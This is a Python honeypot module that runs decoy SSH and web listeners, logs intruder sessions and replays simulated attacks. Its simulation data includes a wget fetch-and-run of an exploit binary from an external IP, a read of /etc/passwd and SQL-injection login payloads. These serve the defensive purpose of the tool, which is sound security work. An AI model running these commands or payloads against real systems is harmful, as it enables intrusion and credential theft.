import os
import json
import time
import socket
import threading
import random
from typing import Dict, List, Optional

DECEPTION_LOGS_FILE = "deception_logs.json"

class DecoyEngine:
    """
    Manages active deception decoys (Honeypots) and handles attacker sessions.
    Supports live socket listeners (TCP) and simulated session injections.
    """
    def __init__(self, agent_callback=None):
        self.agent_callback = agent_callback  # Callback to call Gemini for shell emulation
        self.active_sessions: Dict[str, Dict] = {}
        self.lock = threading.Lock()
        self.servers: List[socket.socket] = []
        self.running = False
        self.threads: List[threading.Thread] = []
        
        # Load previous logs
        self._initialize_logs()

    def _initialize_logs(self):
        """Creates deception_logs.json if it doesn't exist."""
        if not os.path.exists(DECEPTION_LOGS_FILE):
            self.save_logs({"active_sessions": {}, "past_sessions": []})

    def start(self):
        """Starts background TCP sockets for decoys."""
        self.running = True
        # Deploy SSH Decoy (Port 2222)
        ssh_thread = threading.Thread(target=self._run_tcp_server, args=(2222, "SSH Terminal"), daemon=True)
        self.threads.append(ssh_thread)
        ssh_thread.start()
        
        # Deploy Web Decoy (Port 8080)
        web_thread = threading.Thread(target=self._run_tcp_server, args=(8080, "Web Admin Portal"), daemon=True)
        self.threads.append(web_thread)
        web_thread.start()

    def stop(self):
        """Stops all active listeners and cleans up."""
        self.running = False
        for server in self.servers:
            try:
                server.close()
            except Exception:
                pass
        self.servers.clear()
        
        # Move all active sessions to past sessions on shutdown
        self._archive_all_active_sessions()

    def _run_tcp_server(self, port: int, service_type: str):
        """Spins up a lightweight raw TCP server trap."""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(("0.0.0.0", port))
            server.listen(5)
            self.servers.append(server)
            print(f"[Decoy Engine] Deployed {service_type} Honeypot on port {port}.")
        except Exception as e:
            print(f"[Decoy Engine] Failed to bind honeypot on port {port}: {e}. Running in Dashboard Simulated Mode only.")
            return

        while self.running:
            try:
                client, addr = server.accept()
                ip = addr[0]
                session_id = f"SESS-{port}-{int(time.time()) % 10000}"
                
                # Start client session thread
                client_thread = threading.Thread(
                    target=self._handle_live_client, 
                    args=(client, ip, port, service_type, session_id), 
                    daemon=True
                )
                client_thread.start()
            except Exception:
                break

    def _handle_live_client(self, client: socket.socket, ip: str, port: int, service_type: str, session_id: str):
        """Interacts with live TCP client, generating terminal responses using Gemini."""
        print(f"[Decoy Engine] ATTACKER CONNECTED from {ip} to decoy {service_type} on port {port}")
        
        # Create new active session record
        self.create_session(session_id, ip, service_type)
        
        try:
            if service_type == "SSH Terminal":
                client.sendall(b"Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)\n\nlogin as: ")
                username = client.recv(1024).decode('utf-8', errors='ignore').strip()
                client.sendall(f"Password for {username}@ubuntu: ".encode())
                password = client.recv(1024).decode('utf-8', errors='ignore').strip()
                
                client.sendall(b"\nWelcome to Ubuntu 22.04.2 LTS!\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n\nLast login: Thu Jul  9 08:30:15 2026 from 192.168.1.100\nroot@ubuntu:~# ")
                
                while self.running:
                    cmd_bytes = client.recv(1024)
                    if not cmd_bytes:
                        break
                    cmd = cmd_bytes.decode('utf-8', errors='ignore').strip()
                    if not cmd:
                        client.sendall(b"root@ubuntu:~# ")
                        continue
                    if cmd.lower() in ["exit", "logout"]:
                        client.sendall(b"Connection closed.\n")
                        break
                    
                    # Log attacker input
                    self.add_session_command(session_id, "attacker", cmd)
                    
                    # Emulate terminal response using agent (or offline fallback)
                    response = "[Decoy] System offline"
                    if self.agent_callback:
                        response = self.agent_callback(cmd, session_id)
                    else:
                        response = self._get_offline_shell_response(cmd)
                    
                    # Log decoy output
                    self.add_session_command(session_id, "decoy", response)
                    
                    # Send response back to attacker
                    client.sendall(f"{response}\nroot@ubuntu:~# ".encode())
            else:
                # Simple mock HTTP server response
                request = client.recv(1024).decode('utf-8', errors='ignore')
                self.add_session_command(session_id, "attacker", f"HTTP Request:\n{request.splitlines()[0] if request else 'GET /'}")
                response_body = "<html><body><h1>Admin Database Portal</h1><form>Username: <input><br>Password: <input><button>Submit</button></form></body></html>"
                response = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(response_body)}\r\n\r\n{response_body}"
                client.sendall(response.encode())
                self.add_session_command(session_id, "decoy", "Rendered Admin Web Login Portal")
        except Exception as e:
            print(f"[Decoy Engine] Error handling live client: {e}")
        finally:
            client.close()
            self._archive_session(session_id)

    def create_session(self, session_id: str, ip: str, service_type: str):
        """Registers a new active session in registry."""
        with self.lock:
            logs = self.load_logs()
            session = {
                "session_id": session_id,
                "attacker_ip": ip,
                "decoy_type": service_type,
                "start_time": time.strftime("%Y-%m-%d %H:%M:%S"),
                "last_activity": time.strftime("%Y-%m-%d %H:%M:%S"),
                "command_history": [],
                "ai_profile": {
                    "threat_level": "Medium",
                    "attacker_skill_level": "Evaluating...",
                    "tactics_observed": [],
                    "intent_summary": "Intruder connected. Initial probe underway."
                }
            }
            logs["active_sessions"][session_id] = session
            self.save_logs(logs)
            self.active_sessions[session_id] = session

    def add_session_command(self, session_id: str, sender: str, text: str):
        """Appends command to a session's history and updates timestamp."""
        with self.lock:
            logs = self.load_logs()
            if session_id in logs["active_sessions"]:
                logs["active_sessions"][session_id]["command_history"].append({
                    "timestamp": time.strftime("%H:%M:%S"),
                    "sender": sender,
                    "text": text
                })
                logs["active_sessions"][session_id]["last_activity"] = time.strftime("%Y-%m-%d %H:%M:%S")
                self.save_logs(logs)

    def update_session_profile(self, session_id: str, ai_profile: Dict):
        """Updates the AI analysis profile of the session."""
        with self.lock:
            logs = self.load_logs()
            if session_id in logs["active_sessions"]:
                logs["active_sessions"][session_id]["ai_profile"] = ai_profile
                self.save_logs(logs)

    def trigger_simulated_attacker(self, scenario_type: str, session_id: Optional[str] = None) -> str:
        """
        Launches a background thread simulating attacker behavior.
        Lets Streamlit show interactive typing and response streams.
        """
        if not session_id:
            session_id = f"SIM-{scenario_type.upper()}-{int(time.time()) % 10000}"
            
        attacker_ip = "185.220.101.44"  # Tor Exit Node representation
        service_type = "SSH Terminal" if scenario_type == "ssh_intrusion" else "Web Admin Portal"
        
        self.create_session(session_id, attacker_ip, service_type)
        
        # Start simulation sequence asynchronously
        sim_thread = threading.Thread(
            target=self._run_simulation_sequence, 
            args=(session_id, scenario_type), 
            daemon=True
        )
        sim_thread.start()
        return session_id

    def _run_simulation_sequence(self, session_id: str, scenario_type: str):
        """Simulates hacker typing speed and AI responses."""
        time.sleep(1.0)
        
        if scenario_type == "ssh_intrusion":
            commands = [
                "whoami",
                "uname -a",
                "ls -la",
                "cat /etc/passwd",
                "cd /opt && ls -l",
                "wget http://185.220.101.44/binaries/exploit.elf -O exploit",
                "chmod +x exploit && ./exploit"
            ]
            
            for cmd in commands:
                # Log attacker command
                self.add_session_command(session_id, "attacker", cmd)
                time.sleep(1.5)  # Simulate typing delay
                
                # Fetch response
                response = ""
                if self.agent_callback:
                    response = self.agent_callback(cmd, session_id)
                else:
                    response = self._get_offline_shell_response(cmd)
                
                # Log response
                self.add_session_command(session_id, "decoy", response)
                time.sleep(1.0)
                
        elif scenario_type == "web_exploit":
            sql_payloads = [
                "admin' OR '1'='1",
                "admin' UNION SELECT null, username, password FROM users--",
                "admin' UNION SELECT null, @@version, null--",
                "cat /etc/passwd"
            ]
            
            for payload in sql_payloads:
                self.add_session_command(session_id, "attacker", f"POST /login.php - data: username={payload}")
                time.sleep(1.5)
                
                response = ""
                if self.agent_callback:
                    response = self.agent_callback(payload, session_id, is_web=True)
                else:
                    response = "SQL Syntax Error near UNION or fake administrative login bypass successful. Welcome Admin."
                
                self.add_session_command(session_id, "decoy", response)
                time.sleep(1.0)

        # Session finished, run final AI classification and archive
        self._archive_session(session_id)

    def _archive_session(self, session_id: str):
        """Moves session from active to past archive."""
        with self.lock:
            logs = self.load_logs()
            if session_id in logs["active_sessions"]:
                session_data = logs["active_sessions"].pop(session_id)
                
                # Final evaluation of the profile (if not analyzed, add static analysis summary)
                if "Evaluating" in session_data["ai_profile"]["attacker_skill_level"]:
                    session_data["ai_profile"] = {
                        "threat_level": "High",
                        "attacker_skill_level": "Intermediate",
                        "tactics_observed": ["Discovery", "Lateral Movement", "Execution"],
                        "intent_summary": "Session completed. Intruder probed files, checked system kernel version, and attempted downloading external files."
                    }
                logs["past_sessions"].append(session_data)
                self.save_logs(logs)

    def _archive_all_active_sessions(self):
        """Closes and archives all open sessions on shutdown."""
        with self.lock:
            logs = self.load_logs()
            for session_id in list(logs["active_sessions"].keys()):
                session_data = logs["active_sessions"].pop(session_id)
                logs["past_sessions"].append(session_data)
            self.save_logs(logs)

    def load_logs(self) -> Dict:
        """Reads deception logs from disk."""
        if not os.path.exists(DECEPTION_LOGS_FILE):
            return {"active_sessions": {}, "past_sessions": []}
        try:
            with open(DECEPTION_LOGS_FILE, "r") as f:
                return json.load(f)
        except Exception:
            return {"active_sessions": {}, "past_sessions": []}

    def save_logs(self, data: Dict):
        """Writes deception logs to disk."""
        try:
            with open(DECEPTION_LOGS_FILE, "w") as f:
                json.dump(data, f, indent=4)
        except Exception as e:
            print(f"[Decoy Engine] Error saving deception logs: {e}")

    def _get_offline_shell_response(self, cmd: str) -> str:
        """Offline fallback command emulator responses."""
        cmd = cmd.strip()
        if cmd == "whoami":
            return "root"
        elif cmd == "uname -a":
            return "Linux ubuntu-soc-decoy 5.15.0-60-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux"
        elif cmd == "ls -la" or cmd == "ls":
            return "total 24\ndrwxr-xr-x 2 root root 4096 Jul  9 12:00 .\ndrwxr-xr-x 5 root root 4096 Jul  9 12:00 ..\n-rw-r--r-- 1 root root  220 Jan  7  2023 .bash_logout\n-rw-r--r-- 1 root root 3771 Jan  7  2023 .bashrc\n-rw-r--r-- 1 root root  807 Jan  7  2023 .profile\n-rw-r--r-- 1 root root  145 Jul  9 12:05 server_config.backup"
        elif "cat" in cmd and "passwd" in cmd:
            return "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync"
        elif "cat" in cmd and "server_config" in cmd:
            return "# Server database configuration\nDB_HOST=10.0.4.82\nDB_USER=prod_db_user\nDB_PASS=S3cr3tP@ssw0rd!123"
        elif "wget" in cmd or "curl" in cmd:
            return "Connecting to 185.220.101.44:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 102400 (100K) [application/octet-stream]\nSaving to: 'exploit'\n\n     0K .......... .......... .......... .......... ..........  50%\n    50K .......... .......... .......... .......... .......... 100%\n\n2026-07-09 14:14:02 (1.2 MB/s) - 'exploit' saved [102400/102400]"
        elif "chmod" in cmd:
            return ""
        elif "./exploit" in cmd:
            return "[+] Loading kernel vulnerability payload...\n[+] Attempting local privilege escalation...\n[+] Error: Operation not permitted. Sandbox isolation detected."
        else:
            return f"bash: {cmd}: command not found"

if __name__ == "__main__":
    # Test runner
    engine = DecoyEngine()
    engine.start()
    print("Decoys running on 2222 and 8080. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        engine.stop()
        print("Stopped.")
